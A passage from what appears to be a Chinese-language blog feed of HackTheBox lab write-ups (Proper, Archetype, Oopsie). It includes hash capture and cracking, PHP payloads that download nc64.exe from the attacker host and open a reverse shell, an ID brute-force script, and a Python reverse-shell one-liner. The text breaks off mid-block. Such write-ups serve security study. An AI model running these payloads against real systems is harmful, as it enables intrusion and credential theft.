C:\inetpub\wwwroot\functions.php</span><br></pre></td></tr></table></figure><p>不能使用http协议</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -smb2support evil .</span><br><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Incoming connection (10.10.10.231,51174)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,51174)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure><p>拿到Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span> </span><br><span class="line">web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">charlotte123!    (web)</span><br></pre></td></tr></table></figure><p>得到凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web:charlotte123!</span><br></pre></td></tr></table></figure><p>重启smb服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo .</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br></pre></td></tr></table></figure><p>通过竞争修改本地文件内容来进行Bypass</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">payload=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">while</span>((1))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$payload</span>&quot;</span> &gt; header.inc</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>GetShell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c start \windows\system32\spool\drivers\color\yolo.exe -e cmd 10.10.16.7 9990&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thd</span>():</span></span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> _ &lt; <span class="number">100</span>:</span><br><span class="line">req = requests.session()</span><br><span class="line">login_url = <span class="string">&quot;http://10.10.10.231/licenses/index.php&quot;</span></span><br><span class="line">username = <span class="string">&quot;vikki.solomon@throwaway.mail&quot;</span></span><br><span class="line">password = <span class="string">&quot;password1&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>:username, <span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">res = req.post(url=login_url, data=data)</span><br><span class="line">index_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php&quot;</span></span><br><span class="line">res = req.get(url=index_url)</span><br><span class="line">payload_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot;</span></span><br><span class="line">res = req.get(url=payload_url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;hacked&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(res.text)</span><br><span class="line">logout_url = <span class="string">&quot;http://10.10.10.231/licenses/logout.php&quot;</span></span><br><span class="line">res = req.get(url=logout_url)</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">poll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">single_thd = threading.Thread(target=thd)</span><br><span class="line">poll.append(single_thd)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> poll:</span><br><span class="line">n.start()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure><p>不行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe</span><br></pre></td></tr></table></figure><p>行<br />不知道触发了什么奇怪的bug, 改个文件名就能写入了<br /><s>家目录下就能写, 害隔着World-Writable呢</s></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\web\desktop\user.txt</span><br><span class="line">540dbda93520798e554345539fe38988</span><br></pre></td></tr></table></figure><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \&quot;Program Files<span class="string">&quot;\cleanup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">11/15/2020  05:03 AM         2,999,808 client.exe</span></span><br><span class="line"><span class="string">11/15/2020  10:22 AM               174 README.md</span></span><br><span class="line"><span class="string">11/15/2020  06:20 AM         3,041,792 server.exe</span></span><br></pre></td></tr></table></figure><p>FTP莫名其妙用不了</p><p>传文件只能曲线救国了</p><p>Apache2允许PUT但是不能直接上传文件</p><p>不过文件会进行流量传输</p><p>所以就监听流量然后还原文件</p><p>逆向没逆明白, 只能看Raid上的WP了</p><p>先做一个链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /j \users\web\downloads\yoloyolo \users\administrator\desktop</span><br></pre></td></tr></table></figure><p>操控管道<code>\\.\pipe\cleanuppipe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo CLEAN \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br></pre></td></tr></table></figure><p>此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至<code>\programdata\cleanup</code>(这个程序应该是administrator运行的)</p><p>删掉链接, 创建文件夹, 再还原文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rmdir \users\web\downloads\yoloyolo</span><br><span class="line">mkdir \users\web\downloads\yoloyolo</span><br><span class="line"><span class="built_in">echo</span> RESTORE \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br><span class="line"><span class="built_in">type</span> \users\web\downloads\yoloyolo\root.txt</span><br><span class="line"></span><br><span class="line">f2167014736b2934e9721962b525f674</span><br></pre></td></tr></table></figure><p><s>这台机子的姿势太骚了</s></p><p>What a machine.</p><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;The more knowledge you drink, the more thirsty you are.&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Start_Point</title>
    <link href="https://yoloyolo.top/2021/06/04/HTB-Start-Point/"/>
    <id>https://yoloyolo.top/2021/06/04/HTB-Start-Point/</id>
    <published>2021-06-04T16:26:01.000Z</published>
    <updated>2021-07-04T09:25:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>借着HTB多学一些Windows下的渗透技巧</p><a id="more"></a><h1 id="archetype"><a class="markdownIt-Anchor" href="#archetype"></a> Archetype</h1><p>Windows</p><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.27</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.27</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>用smbmap先扫描一波SMB服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27</span><br><span class="line">[+] IP: 10.10.10.27:445Name: 10.10.10.27</span><br></pre></td></tr></table></figure><p>随便加个用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27 -u <span class="built_in">test</span></span><br><span class="line">[+] Guest session   IP: 10.10.10.27:445Name: 10.10.10.27                                       </span><br><span class="line">        Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">backups                                           READ ONLY</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br></pre></td></tr></table></figure><p>空密码即可登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.27\\backups -U <span class="built_in">test</span></span><br><span class="line">Enter WORKGROUP\<span class="built_in">test</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; dir</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020</span></span><br><span class="line"><span class="string">  schtasks.txt                        A   174006  Fri Jun  4 12:05:57 2021</span></span><br><span class="line"><span class="string">  services.txt                        A     6370  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10328063 blocks of size 4096. 8165400 blocks available</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get prod.dtsConfig</span><br><span class="line">getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DTSConfiguration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DTSConfigurationFileInfo</span> <span class="attr">GeneratedBy</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageName</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageID</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedDate</span>=<span class="string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;</span>&quot;/&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ConfiguredType</span>=<span class="string">&quot;Property&quot;</span> <span class="attr">Path</span>=<span class="string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> <span class="attr">ValueType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ConfiguredValue</span>&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="tag">&lt;/<span class="name">ConfiguredValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DTSConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到MSSQL账户<code>ARCHETYPE\sql_svc:M3g4c0rp123</code></p><p>这里使用impacket来登入</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>可以执行系统命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; xp_cmdshell whoami</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">archetype\sql_svc                                                                  </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\desktop\user.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p><code>C:\users\sql_svc\appdata</code>为隐藏路径, 需要使用<code>dir /a</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!            </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>                                                                               </span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure><p>通过查看powershell的历史记录得到administrator的账户</p><p><code>Archetype\administrator:MEGACORP_4dm1n!!</code></p><p>在使用<code>impacket</code>中的<code>psexec.py</code>来得到管理员权限的Shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py archetype/administrator@10.10.10.27</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.10.27.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file OFvCNrQJ.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.27.....</span><br><span class="line">[*] Creating service SMtb on 10.10.10.27.....</span><br><span class="line">[*] Starting service SMtb.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\users\administrator\desktop\root.txt</span><br><span class="line">b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure><hr /><blockquote><p>尝试不使用psexec运行管理员权限命令的一波三折</p></blockquote><p>Windows下可以使用runas命令来以其他用户的身份运行命令<br />如<code>runas /savecred /user:administrator whoami</code><br />但是不能直接通过参数输入密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami</span><br><span class="line">试图将 whoami 作为用户 <span class="string">&quot;DOMAIN\administrator&quot;</span> 启动...</span><br><span class="line">输入 administrator 的密码:</span><br></pre></td></tr></table></figure><p>密码的输入需要以交互式的方式来输入, 就无法在MSSQL的非交互式Shell中直接提权</p><p>而可以使用sanur这个工具来进行密码的命令行输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami | sanur.exe password</span><br></pre></td></tr></table></figure><p>但是紧接着问题又来了<br />runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行, 这样的话就不能在MSSQL的Shell中看到回显</p><p>所以尝试了文件写入保存命令运行结果的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator <span class="string">&quot;cmd /c whoami &gt; C:\1&quot;</span> | sanur.exe password</span><br></pre></td></tr></table></figure><p>本地运行成功了, 但是目标机器不行(无奈)</p><hr /><h1 id="oopsie"><a class="markdownIt-Anchor" href="#oopsie"></a> Oopsie</h1><p>Linux</p><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.28</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.28</span><br><span class="line">Host is up (0.68s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE   VERSION</span><br><span class="line">22/tcp open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http            Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>在首页的源码看到这样一条JS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/cdn-cgi/login/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>得到路径<code>/cdn-cgi/login</code></p><p>访问该路径即为登入页面<br />这里的登入需要使用上一台靶机的Administrator密码, 有点坑<br /><code>admin:MEGACORP_4dm1n!!</code></p><p>访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />提示<code>This action require super admin rights.</code><br />且<code>Cookie</code>中的内容为<code>user=34322; role=admin</code><br />那么只要能够得到<code>super admin</code>的<code>id</code>值与<code>username</code>即可越权</p><p><code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code><br />访问该路径可以得到<code>admin</code>的账户信息<br />可以通过爆破参数<code>id</code>来得到<code>super admin</code>的信息</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;user=34322; role=admin&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">    res = req.get(url, headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;super&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(_)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>id为30, 得到如下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access ID   Name            Email</span><br><span class="line">86575       super admin     superadmin@megacorp.com</span><br></pre></td></tr></table></figure><p>通过在Burpsuite中修改Cookie为<code>Cookie: user=86575; role=super admin</code>来访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />上传weevely的Shell即可获得权限</p><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>使用python反弹Shell到本机</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><p>获得tty<br />(好像是用于获取一个终端会话, 否则后续的切换用户操作无法进行)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>之前查看用户信息的页面应该用到了SQL的操作<br />那么就可以去找SQL的配置信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 